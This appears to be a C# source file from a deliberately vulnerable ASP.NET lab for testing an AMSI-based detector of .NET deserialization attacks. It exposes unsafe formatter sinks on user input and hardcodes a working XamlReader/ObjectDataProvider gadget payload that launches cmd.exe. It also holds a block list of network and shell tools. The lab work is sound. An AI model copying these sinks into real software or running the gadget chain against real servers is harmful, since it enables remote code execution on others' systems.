using Microsoft.CSharp;
using Microsoft.SqlServer.Server;

using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.Services.Internal;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Web.UI;
using System.Windows.Data;
using System.Xml.Serialization;

namespace WebApplication
{
    /// <summary>
    /// Deliberately vulnerable deserialization sinks and helpers backing the
    /// Deserialization Lab view of Default.aspx.
    ///
    /// Threat model: the whole point of the WebApplication project is to be a
    /// controlled lab where the CVEonDeserializationFinder AMSI provider can
    /// observe malicious ysoserial payloads landing inside w3wp.exe. This
    /// class MUST NOT ship anywhere reachable from an untrusted network.
    /// </summary>
    public static class DeserializationLab
    {
        private static IntPtr _amsiContext = IntPtr.Zero;

        public sealed class LastAttempt
        {
            public DateTime Utc;
            public string Sink;
            public int PayloadBytes;
            public bool Ok;
            public string Message;
        }

        // Small ring-buffer of last N attempts to render in the UI.
        private static readonly List<LastAttempt> RecentAttempts = new List<LastAttempt>();
        private const int MaxRecent = 8;

        public static IReadOnlyList<LastAttempt> Recent()
        {
            lock (RecentAttempts) return RecentAttempts.ToArray();
        }

        private static void Record(string sink, int len, bool ok, string message)
        {
            lock (RecentAttempts)
            {
                RecentAttempts.Insert(0, new LastAttempt
                {
                    Utc = DateTime.UtcNow,
                    Sink = sink,
                    PayloadBytes = len,
                    Ok = ok,
                    Message = message,
                });
                if (RecentAttempts.Count > MaxRecent) RecentAttempts.RemoveRange(MaxRecent, RecentAttempts.Count - MaxRecent);
            }
        }

        /// <summary>
        /// Decode a base64 string and dispatch to the requested sink. Any
        /// exception is caught and returned in the LastAttempt entry — this
        /// is critical for demo pages so the site keeps responding after an
        /// exploit lands.
        /// </summary>
        public static LastAttempt Deserialize(string sink, string base64)
        {
            byte[] bytes;
            try
            {
                bytes = Convert.FromBase64String((base64 ?? string.Empty).Trim());
            }
            catch (FormatException ex)
            {
                Record(sink, 0, false, "base64 decode error: " + ex.Message);
                return Recent()[0];
            }

            try
            {
                switch ((sink ?? string.Empty).ToLowerInvariant())
                {
                    case "bf":
                        DoBinaryFormatter(bytes);
                        break;
                    case "xml":
                        DoXmlSerializerToolShell(bytes);
                        //DoXmlSerializerObjectDataProvider(bytes);
                        break;
                    case "los":
                        DoLosFormatter(bytes);
                        break;
                    case "osf":
                        DoObjectStateFormatter(bytes);
                        break;
                    case "xmlod":
                        DoObjectStateFormatter(bytes);
                        break;
                    default:
                        Record(sink, bytes.Length, false, "unknown sink: " + sink);
                        return Recent()[0];
                }
                Record(sink, bytes.Length, true, "deserialized without exception");
            }
            catch (Exception ex)
            {
                // Even a "failed" deserialize is a lab success — the gadget
                // code path typically runs before the exception surfaces.
                Record(sink, bytes.Length, false, ex.GetType().Name + ": " + ex.Message);
            }
            return Recent()[0];
        }

        private static void DoBinaryFormatter(byte[] bytes)
        {
            var bf = new BinaryFormatter();
            using (var ms = new MemoryStream(bytes)) bf.Deserialize(ms);
        }


        // Reproduces generic ObjectDataProvider
        // is what forces the runtime to materialise a Microsoft.GeneratedCode
        // temp assembly containing references to ObjectDataProvider — which is
        // exactly what our AMSI provider matches on.
        private static void DoXmlSerializerObjectDataProvider(byte[] bytes)
        {
            
            var t = typeof(ObjectDataProvider);
            var xs = new XmlSerializer(t);


            using (var ms = new MemoryStream(bytes)) xs.Deserialize(ms);
        }

        // Reproduces the ToolShell / CVE-2025-53770 XmlSerializer configuration:
        // the closed generic List<ExpandedWrapper<LosFormatter, ObjectDataProvider>>
        // is what forces the runtime to materialise a Microsoft.GeneratedCode
        // temp assembly containing references to ObjectDataProvider — which is
        // exactly what our AMSI provider matches on.
        private static void DoXmlSerializerToolShell(byte[] bytes)
        {
            //var t = typeof(List<ExpandedWrapper<LosFormatter, ObjectDataProvider>>);
            //var t = typeof(ExpandedWrapper<LosFormatter, ObjectDataProvider>);
            var t = typeof(
                ExpandedWrapper<
                    System.Windows.Markup.XamlReader,
                    System.Windows.Data.ObjectDataProvider>);
            //var t = typeof(ObjectDataProvider);
            var xs = new XmlSerializer(t);

            // Bridge for the thin-provider architecture: explicitly pass the
            // generated serializer helper assembly to AMSI from inside w3wp.
            // This keeps C++ minimal and still provides runtime evidence.
            TryScanXmlSerializerHelperWithAmsi(xs);
              byte[] byteArray = Encoding.Unicode.GetBytes("<?xml version=\"1.0\"?>\r\n<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" >\r\n        <ExpandedElement/>\r\n        <ProjectedProperty0>\r\n            <MethodName>Parse</MethodName>\r\n            <MethodParameters>\r\n                <anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">\r\n                    <![CDATA[<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:b=\"clr-namespace:System;assembly=mscorlib\" xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c ping ya.ru -n 10</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>\r\n                </anyType>\r\n            </MethodParameters>\r\n            <ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance>\r\n        </ProjectedProperty0>\r\n    </ExpandedWrapperOfXamlReaderObjectDataProvider>");
            //byte[] byteArray = Encoding.Unicode.GetBytes("<?xml version=\"1.0\"?>\r\n<root type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">\r\n    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" >\r\n        <ExpandedElement/>\r\n        <ProjectedProperty0>\r\n            <MethodName>Parse</MethodName>\r\n            <MethodParameters>\r\n                <anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">\r\n                    <![CDATA[<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:b=\"clr-namespace:System;assembly=mscorlib\" xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c ping ya.ru -n 10</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>\r\n                </anyType>\r\n            </MethodParameters>\r\n            <ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance>\r\n        </ProjectedProperty0>\r\n    </ExpandedWrapperOfXamlReaderObjectDataProvider>\r\n</root>");
            //byte[] byteArray = Encoding.Unicode.GetBytes("<?xml version=\"1.0\" encoding=\"utf-16\"?>\r\n<ObjectDataProvider MethodName=\"Start\" IsInitialLoadEnabled=\"False\" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:sd=\"clr-namespace:System.Diagnostics;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\">\r\n  <ObjectDataProvider.ObjectInstance>\r\n    <sd:Process>\r\n      <sd:Process.StartInfo>\r\n        <sd:ProcessStartInfo Arguments=\"/c ping ya.ru -n 10\" StandardErrorEncoding=\"{x:Null}\" StandardOutputEncoding=\"{x:Null}\" UserName=\"\" Password=\"{x:Null}\" Domain=\"\" LoadUserProfile=\"False\" FileName=\"cmd\" />\r\n      </sd:Process.StartInfo>\r\n    </sd:Process>\r\n  </ObjectDataProvider.ObjectInstance>\r\n</ObjectDataProvider>");
            MemoryStream stream = new MemoryStream(byteArray);
            xs.Deserialize(stream);
            //using (var ms = new MemoryStream(bytes)) xs.Deserialize(ms);
        }

        private static void TryScanXmlSerializerHelperWithAmsi(XmlSerializer xs)
        {
            try
            {
                if (xs == null) return;

                var tempAsmField = typeof(XmlSerializer).GetField("tempAssembly", BindingFlags.Instance | BindingFlags.NonPublic);
                var tempAsmObj = tempAsmField?.GetValue(xs);
                if (tempAsmObj == null) return;

                var asmField = tempAsmObj.GetType().GetField("assembly", BindingFlags.Instance | BindingFlags.NonPublic);
                var asm = asmField?.GetValue(tempAsmObj) as Assembly;
                if (asm == null || asm.IsDynamic) return;
                if (string.IsNullOrWhiteSpace(asm.Location) || !File.Exists(asm.Location)) return;

                var bytes = File.ReadAllBytes(asm.Location);
                if (bytes == null || bytes.Length == 0) return;

                var contentName = Path.GetFileName(asm.Location) ?? "XmlSerializer.TempAssembly";
                AmsiScanManagedBuffer(bytes, contentName);
            }
            catch
            {
                // Non-fatal in lab flow: deserialization path continues.
            }
        }

        private static void AmsiScanManagedBuffer(byte[] bytes, string contentName)
        {
            if (bytes == null || bytes.Length == 0) return;

            if (_amsiContext == IntPtr.Zero)
            {
                var hrInit = AmsiInitialize("WebApplication.DeserializationLab", out _amsiContext);
                if (hrInit != 0 || _amsiContext == IntPtr.Zero) return;
            }

            IntPtr session;
            var hrOpen = AmsiOpenSession(_amsiContext, out session);
            if (hrOpen != 0 || session == IntPtr.Zero) return;

            try
            {
                int result;
                AmsiScanBuffer(_amsiContext,
                               bytes,
                               (uint)bytes.Length,
                               contentName ?? "ManagedAssembly",
                               session,
                               out result);
            }
            finally
            {
                AmsiCloseSession(_amsiContext, session);
            }
        }

        [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
        private static extern int AmsiInitialize(string appName, out IntPtr amsiContext);

        [DllImport("amsi.dll")]
        private static extern int AmsiOpenSession(IntPtr amsiContext, out IntPtr session);

        [DllImport("amsi.dll")]
        private static extern void AmsiCloseSession(IntPtr amsiContext, IntPtr session);

        [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
        private static extern int AmsiScanBuffer(IntPtr amsiContext,
                                                 byte[] buffer,
                                                 uint length,
                                                 string contentName,
                                                 IntPtr session,
                                                 out int result);

        private static void DoLosFormatter(byte[] bytes)
        {
            var los = new LosFormatter();
            using (var ms = new MemoryStream(bytes)) los.Deserialize(ms);
        }


        private static void DoObjectStateFormatter(byte[] bytes)
        {
            var osf = new ObjectStateFormatter();
            using (var ms = new MemoryStream(bytes)) osf.Deserialize(ms);
        }

        // ------------------------------------------------------------------
        // Child-process detector: WMI Win32_Process filtered by our own PID.
        // The proof-of-exploit is any child spawned by w3wp.exe — legitimate
        // ASP.NET does not fork ping.exe / cmd.exe / powershell.exe.
        // ------------------------------------------------------------------
        public sealed class ChildProc
        {
            public uint Pid;
            public string Name;
            public string CommandLine;
            public bool Suspicious;
        }

        private static readonly HashSet<string> Suspicious = new HashSet<string>(
            new[] { "ping.exe", "cmd.exe", "powershell.exe", "pwsh.exe",
                    "calc.exe", "notepad.exe", "wscript.exe", "cscript.exe",
                    "mshta.exe", "rundll32.exe", "regsvr32.exe", "certutil.exe",
                    "bitsadmin.exe", "curl.exe", "wget.exe", "nc.exe", "ncat.exe" },
            StringComparer.OrdinalIgnoreCase);

        public static List<ChildProc> ListChildren()
        {
            var myPid = Process.GetCurrentProcess().Id;
            var list = new List<ChildProc>();
            try
            {
                var q = "SELECT ProcessId, Name, CommandLine FROM Win32_Process WHERE ParentProcessId=" + myPid;
                using (var s = new ManagementObjectSearcher(q))
                using (var results = s.Get())
                {
                    foreach (ManagementObject mo in results)
                    {
                        var name = (string)mo["Name"] ?? "";
                        var cmd = (string)mo["CommandLine"] ?? "";
                        list.Add(new ChildProc
                        {
                            Pid = (uint)mo["ProcessId"],
                            Name = name,
                            CommandLine = cmd,
                            Suspicious = Suspicious.Contains(name),
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                list.Add(new ChildProc { Pid = 0, Name = "(WMI error)", CommandLine = ex.Message, Suspicious = false });
            }
            return list;
        }

        // ------------------------------------------------------------------
        // Benign base64 examples — hardcoded from PayloadGenerator "demo".
        // Regenerate with: CVEonDeserializationFinder.PayloadGenerator demo
        // ------------------------------------------------------------------
        public static string BenignFor(string sink)
        {
            switch ((sink ?? string.Empty).ToLowerInvariant())
            {
                case "bf":  return BenignBf;
                case "xml": return BenignXml;
                case "los": return BenignLos;
                case "osf": return BenignOsf;
                default:    return string.Empty;
            }
        }

        // List<string> { "hello", "benign", "world" }
        public const string BenignBf =
            "AAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5" +
            "c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVi" +
            "bGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24GAAAI" +
            "CAkCAAAAAwAAAAMAAAARAgAAAAQAAAAGAwAAAAVoZWxsbwYEAAAABmJlbmlnbgYFAAAABXdvcmxkCgs=";

        // XmlSerializer(List<int>{1..5}) — will materialise Microsoft.GeneratedCode
        // but contains no dangerous types (no rule match). ToolShell-style
        // typeof gets exercised on the receiving side.
        public const string BenignXml =
            "PD94bWwgdmVyc2lvbj0iMS4wIj8+DQo8QXJyYXlPZkludCB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMu" +
            "b3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIw" +
            "MDEvWE1MU2NoZW1hIj4NCiAgPGludD4xPC9pbnQ+DQogIDxpbnQ+MjwvaW50Pg0KICA8aW50PjM8L2lu" +
            "dD4NCiAgPGludD40PC9pbnQ+DQogIDxpbnQ+NTwvaW50Pg0KPC9BcnJheU9mSW50Pg==";

        // int[]{10..50}
        public const string BenignLos = "L3dFVUt3RUZBZ29DRkFJZUFpZ0NNZz09";

        // Dictionary<string,int>{alpha=1,beta=2,gamma=3}
        public const string BenignOsf =
            "/wEygwsAAQAAAP////8BAAAAAAAAAAQBAAAA4QFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5EaWN0" +
            "aW9uYXJ5YDJbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9" +
            "bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5JbnQzMiwgbXNj" +
            "b3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh" +
            "NWM1NjE5MzRlMDg5XV0EAAAAB1ZlcnNpb24IQ29tcGFyZXIISGFzaFNpemUNS2V5VmFsdWVQYWlycwAD" +
            "AAMIkgFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5HZW5lcmljRXF1YWxpdHlDb21wYXJlcmAxW1tT" +
            "eXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1" +
            "YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQjlAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmlj" +
            "LktleVZhbHVlUGFpcmAyW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBD" +
            "dWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uSW50" +
            "MzIsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9r" +
            "ZW49Yjc3YTVjNTYxOTM0ZTA4OV1dW10DAAAACQIAAAADAAAACQMAAAAEAgAAAJIBU3lzdGVtLkNvbGxl" +
            "Y3Rpb25zLkdlbmVyaWMuR2VuZXJpY0VxdWFsaXR5Q29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNj" +
            "b3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh" +
            "NWM1NjE5MzRlMDg5XV0AAAAABwMAAAAAAQAAAAMAAAAD4wFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJp" +
            "Yy5LZXlWYWx1ZVBhaXJgMltbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwg" +
            "Q3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLklu" +
            "dDMyLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRv" +
            "a2VuPWI3N2E1YzU2MTkzNGUwODldXQT8////4wFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5LZXlW" +
            "YWx1ZVBhaXJgMltbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVy" +
            "ZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkludDMyLCBt" +
            "c2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3" +
            "N2E1YzU2MTkzNGUwODldXQIAAAADa2V5BXZhbHVlAQAIBgUAAAAFYWxwaGEBAAAAAfr////8////Bgc" +
            "AAAAEYmV0YQIAAAAB+P////z///8GCQAAAAVnYW1tYQMAAAAL";
    }
}
